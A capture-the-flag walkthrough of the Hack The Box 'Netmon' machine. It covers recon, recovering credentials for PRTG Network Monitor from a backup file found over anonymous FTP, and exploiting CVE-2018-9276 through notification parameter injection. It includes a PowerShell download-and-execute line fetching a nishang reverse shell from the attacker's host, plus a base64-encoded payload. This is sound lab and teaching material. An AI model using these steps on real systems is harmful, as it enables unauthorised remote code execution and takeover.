---
title: "HTB: Netmon [Easy]"
date: 2026-01-19 00:00 +0800
categories: [HTB, Easy]
tags: [HTB, Easy, Windows, CVE-2018-9276, RCE]
image: https://github.com/user-attachments/assets/659c3ff1-813e-4474-9389-e2ca97728139
---

<img width="878" height="346" alt="image" src="https://github.com/user-attachments/assets/659c3ff1-813e-4474-9389-e2ca97728139" />

<img width="1599" height="154" alt="image" src="https://github.com/user-attachments/assets/362ef4b8-ac2f-40a9-a72f-812e0fb59d25" />

## Recon

command used:
```
nmap -Pn -sCV -v -oA nmap/netmon 10.129.230.176
```
nmap scan result: 
```
# Nmap 7.98 scan initiated Mon Jan 19 11:50:36 2026 as: /usr/lib/nmap/nmap --privileged -Pn -sCV -v -oA nmap/netmon 10.129.230.176
Nmap scan report for 10.129.230.176
Host is up (0.050s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 02-03-19  07:08AM       <DIR>          Users
|_11-10-23  09:20AM       <DIR>          Windows
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp   open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-trane-info: Problem with XML parsing of /evox/about
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: PRTG/18.1.37.13946
|_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-01-19T03:50:51
|_  start_date: 2026-01-19T03:29:52
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan 19 11:50:58 2026 -- 1 IP address (1 host up) scanned in 21.72 seconds
```

There's multiple open port which running ftp, http, and multiple smb related. We identified inside ftp, we can access from "c:\" anonymously. After a little enumeration referring from this **[github](https://gist.github.com/korrosivesec/a339e376bae22fcfb7f858426094661e)** looking for windows sensitive files. There's nothing much.

After, i visited the http services and being prompt with login and pass. Tried mutliple default creds such ah `"admin:pass"`,`"admin:admin"` and `"prtgadmin:prtgadmin"` which default prtg creds. Still, no results.

Tried to find known cve's for its version, however we still need to be authenticated to exploit it.

<img width="1556" height="813" alt="image" src="https://github.com/user-attachments/assets/fc7f0d0a-aad1-4ffb-9063-e86d6d1e2e6e" />

Decided to used ftp to enumerate the http. Googled for "PRTG network monitor sensitive files location for windows" which direct us to this `C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.dat`

<img width="835" height="886" alt="image" src="https://github.com/user-attachments/assets/2251fbce-6e9f-488e-9469-78005cceff1e" />

We can use the ftp services and find the config file with `.bak` around year before the latest one.

<img width="816" height="706" alt="image" src="https://github.com/user-attachments/assets/1cf1d08b-a581-4c78-8e84-72412a2391fd" />

After further enumeration we able to find the **username** and **password**. 

command use:
```
grep -B5 -A5 -i password  PRTG\ Configuration.old.bak | sed 's/ //g' | sort -u
```
result snippet:
```
<proxyport>
	PrTg@dmin2018
PRTGSystemAdministrator
<retrysnmp>
	<!--User:prtgadmin-->
</wbemprotocol>
```

However we still can't logged in. If we review back the date for files inside `C:\ProgramData\Paessler\PRTG Network Monitor\` only the `.bak` is dated as `07-14-2018` while other config files is around `2019`

<img width="821" height="706" alt="image" src="https://github.com/user-attachments/assets/0ec486c8-c8fe-4ba8-9c8b-6914e427b71b" />

So the password policy incremented the password depending on the current year.

`prtgadmin:PrTg@dmin2018` -> `prtgadmin:PrTg@dmin2019`

Once logged in, we brought to **PRTG System Administrator Dashboard**. 

<img width="1539" height="718" alt="image" src="https://github.com/user-attachments/assets/bfe2df7e-7d18-4c47-890c-0ce4e75cc5c6" />

Googled for "PRTG System Administrator 18.1.37.13946" and find known **CVE-2018-9276** that led to **RCE**. After reading, we could exploit by running any powershell cmd through notification Program Execution.

<img width="700" height="677" alt="image" src="https://github.com/user-attachments/assets/53e5e708-adb6-47da-b856-67327d11f14d" />

Go inside setup

<img width="1561" height="722" alt="image" src="https://github.com/user-attachments/assets/503eb39f-b526-4330-a900-0cdbfed1883a" />

Settings 

<img width="1533" height="318" alt="image" src="https://github.com/user-attachments/assets/ce3837d7-a3bb-404b-8f3b-08734b2f3fde" />

Find Execute Program

<img width="816" height="668" alt="image" src="https://github.com/user-attachments/assets/bc59dd86-9d2f-4798-882c-8ce5c093f8bf" />

Program File: `Demo exe notification - outfile.ps1`

Parameter: `huh | ping -n 1 10.10.14.27` (just to verify if there's command execution)

Setup **tcpdump** for icmp, save and send notification

<img width="1533" height="318" alt="image" src="https://github.com/user-attachments/assets/09f27c76-dda9-4637-9855-3068ab645b0a" />

We should be able to see the packets which verify RCE's working.

<img width="771" height="140" alt="image" src="https://github.com/user-attachments/assets/9c6e34d4-0444-4273-996d-1f5e521c24ce" />

For reverse shell, I used **[Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)** from **[nishang](https://github.com/samratashok/nishang)** 

Setup listener as well as our webserver to listen on port 80:

```
python3 -m http.server 80
```
```
IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.27:80/reverse.ps1")
```

<img width="1235" height="585" alt="image" src="https://github.com/user-attachments/assets/61da38c3-6610-4942-8413-7a4971c589d3" />

Unfortunaly this does not give us a shell. So we will eliminate bad characters by Base64 encoding the shell script:
```
cat reverse.ps1 | iconv -t UTF-16LE | base64 -w 0 | xclip -selection clipboard
```

> **xclip -selection clipboard** is how we can directly copy the output inside our clipboard

Copy the long Base64 string and input it into the parameter and send the notification again:
```
test | powershell -enc [base64 shell.ps1]
```
This time we get a reverse shell as NT Authority\SYSTEM and can read root.txt!

<img width="1104" height="783" alt="image" src="https://github.com/user-attachments/assets/7c9fe12c-ea73-4fab-b655-9c98f13bc8bf" />

Of course, there's known **msfconsole** module for this as well which `exploit/windows/http/prtg_authenticated_rce`.
